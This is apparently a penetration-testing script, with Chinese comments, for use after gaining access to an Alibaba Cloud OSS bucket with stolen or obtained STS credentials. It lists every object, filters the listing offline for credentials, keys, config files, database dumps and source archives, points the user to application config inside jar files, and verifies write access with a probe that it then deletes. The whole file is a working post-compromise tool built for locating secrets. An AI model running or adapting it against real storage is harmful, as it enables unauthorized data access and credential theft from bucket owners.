#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
oss_manifest_dump.py — 对象存储桶接管后的标准两步:① 全量清单落盘 ② 离线挑高价值对象

用法(务必 python3 -u,否则块缓冲会吞掉进度、跑到一半看不出卡在哪):
  # ① 列桶 + 落清单(STS 15 分钟时效,超时重新取签名)
  python3 -u oss_manifest_dump.py dump \
      --ak <STS.AK> --sk <SK> --st <securityToken> \
      --endpoint oss-cn-hangzhou.aliyuncs.com --bucket yx-xxx \
      --out mani_yx-xxx.txt

  # ② 本地离线挑拣(不联网、不碰目标)
  python3 oss_manifest_dump.py pick --manifest mani_yx-xxx.txt --out oss_pick

  # ③ 可选:写权限闭环验证(自证 + 复原)
  python3 -u oss_manifest_dump.py wtest --ak .. --sk .. --st .. --endpoint .. --bucket ..

依赖: pip3 install oss2 --break-system-packages   (PEP668 环境)
说明: 只做「列桶 / 读一个小对象 / 写探针并复原」,不做大规模下载 —— 清单本身就是交付物。
"""
import argparse, collections, json, os, sys, time

# ---------------------------------------------------------------- 分类规则
MEDIA_NOISE = {"ts", "m3u8", "jpg", "jpeg", "png", "gif", "webp", "mp4", "mov",
               "bmp", "heic", "aac", "mp3", "wav", "flv", "mkv"}
CODE_EXT = {"jar", "war", "zip", "rar", "7z", "tar", "gz", "tgz", "exe", "apk", "dmg",
            "py", "pyc", "sh", "bash", "js", "ts_", "java", "go", "php", "rb", "pl",
            "yml", "yaml", "properties", "xml", "env", "conf", "ini", "toml",
            "bak", "sql", "dump", "xlsx", "xls", "csv", "log", "txt", "md",
            "json", "pem", "key", "p12", "jks", "keystore", "crt", "cer", "sqlite", "db"}
WORDS = ("config", "secret", "token", "passwd", "password", "credential", "backup", "dump",
         "key", "cert", "private", "deploy", "docker", "kube", "oss", "aliyun", "aws",
         "source", "src", "code", "project", "package", "build", "release", "test",
         "gray", "prod", "使用说明", "readme", "template", "模版", "说明")


def load_oss(args):
    import oss2
    auth = oss2.StsAuth(args.ak, args.sk, args.st)
    return oss2.Bucket(auth, args.endpoint, args.bucket)


def cmd_dump(args):
    """分页列桶 → 落清单(path+size)。带进度打点,不下载内容。"""
    import oss2
    b = load_oss(args)
    n = 0
    t0 = time.time()
    with open(args.out, "w", encoding="utf-8") as f:
        for obj in oss2.ObjectIteratorV2(b, max_keys=1000):
            f.write("%d\t%s\n" % (obj.size, obj.key))
            n += 1
            if n % 20000 == 0:
                sys.stdout.write("  ...%d 对象 %.1fs\n" % (n, time.time() - t0))
                sys.stdout.flush()
    print("[done] %s  %d 对象  %.1fs" % (args.out, n, time.time() - t0))
    print("[next] python3 %s pick --manifest %s" % (os.path.basename(__file__), args.out))


def cmd_pick(args):
    """离线挑拣:先排除媒体噪声(.ts 与 TypeScript 撞名,靠大小/路径二次判断),再按扩展名 + 关键词。"""
    by_ext = collections.Counter()
    noise = 0
    picks, big = [], []
    with open(args.manifest, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.rstrip("\n")
            if "\t" not in line:
                continue
            size_s, key = line.split("\t", 1)
            try:
                size = int(size_s)
            except ValueError:
                continue
            ext = key.rsplit(".", 1)[-1].lower() if "." in key.rsplit("/", 1)[-1] else ""
            by_ext[ext or "(none)"] += 1
            if ext in MEDIA_NOISE or (ext == "ts" and size < 8 * 1024 * 1024):
                noise += 1
                continue
            hit_word = any(w in key.lower() for w in WORDS)
            if ext in CODE_EXT or hit_word:
                (big if size > 60 * 1024 * 1024 else picks).append((size, key))

    picks.sort(key=lambda x: x[0])
    big.sort(reverse=True)
    os.makedirs(args.out, exist_ok=True)
    with open(os.path.join(args.out, "pick_small.txt"), "w", encoding="utf-8") as f:
        for s, k in picks:
            f.write("%d\t%s\n" % (s, k))
    with open(os.path.join(args.out, "pick_big.txt"), "w", encoding="utf-8") as f:
        for s, k in big:
            f.write("%d\t%s\n" % (s, k))
    with open(os.path.join(args.out, "ext_histogram.json"), "w", encoding="utf-8") as f:
        json.dump(by_ext.most_common(60), f, ensure_ascii=False, indent=1)

    print("扩展名 Top: %s" % by_ext.most_common(15))
    print("媒体噪声已排除: %d" % noise)
    print("候选: 小文件 %d 个 -> %s/pick_small.txt" % (len(picks), args.out))
    print("候选: 大文件 %d 个 -> %s/pick_big.txt  (构建产物/模型,按需再取)" % (len(big), args.out))
    print("[重点] 优先取 .jar/.war/.zip/.bak/.yml/.properties/.sh/.py/.xlsx —— 解开读 BOOT-INF/classes/application*.yml")


def cmd_wtest(args):
    """写权限闭环: PUT 探针 → GET 回读 → DELETE → HEAD 确认 404。可复原才写进报告。"""
    import oss2
    b = load_oss(args)
    key = "pentest-probe/delete-me-%s.txt" % time.strftime("%Y%m%d")
    body = b"pentest write-probe %s" % time.strftime("%Y-%m-%d %H:%M:%S").encode()
    b.put_object(key, body)
    got = b.get_object(key).read()
    ok_read = (got == body)
    b.delete_object(key)
    gone = False
    try:
        b.head_object(key)
    except oss2.exceptions.NoSuchKey:
        gone = True
    except Exception:
        gone = True
    print("PUT ok / GET 回读一致=%s / DELETE ok / HEAD 404=%s" % (ok_read, gone))
    print("[口径] 报告写\"已验证写权限并复原\";禁止声称\"无任何残留\"。")


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("dump", "wtest"):
        p = sub.add_parser(name)
        p.add_argument("--ak", required=True)
        p.add_argument("--sk", required=True)
        p.add_argument("--st", default="")          # 长期 AK/SK 时可留空
        p.add_argument("--endpoint", required=True)
        p.add_argument("--bucket", required=True)
        if name == "dump":
            p.add_argument("--out", required=True)
    q = sub.add_parser("pick")
    q.add_argument("--manifest", required=True)
    q.add_argument("--out", default="oss_pick")
    args = ap.parse_args()
    {"dump": cmd_dump, "pick": cmd_pick, "wtest": cmd_wtest}[args.cmd](args)


if __name__ == "__main__":
    main()
